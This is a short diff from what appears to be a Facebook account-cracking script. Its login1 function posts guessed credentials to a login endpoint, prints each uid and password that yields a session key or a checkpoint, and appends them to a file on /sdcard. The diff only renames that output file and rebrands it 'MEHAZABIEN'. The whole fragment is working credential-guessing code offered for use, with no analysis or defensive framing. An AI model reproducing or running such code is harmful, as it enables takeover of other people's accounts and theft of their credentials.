@@ -718,12 +718,12 @@ def login1(uid):
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
                 print(f'\r\r\r\r\r\033[1;97m[\x1b[38;5;46mMEHAZABIEN\033[1;97m] \x1b[38;5;46m{uid} \033[1;97m=\x1b[38;5;46m{pw}\033[1;97m')
-                open("/sdcard/CRACKED-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                open("/sdcard/MEHAZABIEN-OLD-Ok.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
                 print(f'\r\r\r\r\r\033[1;97m[\x1b[38;5;46mMEHAZABIEN\033[1;97m] \x1b[38;5;46m{uid} \033[1;97m=\x1b[38;5;46m{pw}\033[1;97m')
-                open("/sdcard/CRACKED-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                open("/sdcard/MEHAZABIEN-OLD-Ok.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
